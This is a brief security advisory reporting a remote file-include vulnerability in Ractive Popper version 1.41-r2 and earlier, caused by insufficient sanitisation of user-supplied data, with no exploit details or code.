Ractive Popper is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.

Exploiting this issue could allow an attacker to compromise the application and the underlying system; other attacks are also possible.

Version 1.41-r2 and prior are affected by this issue.
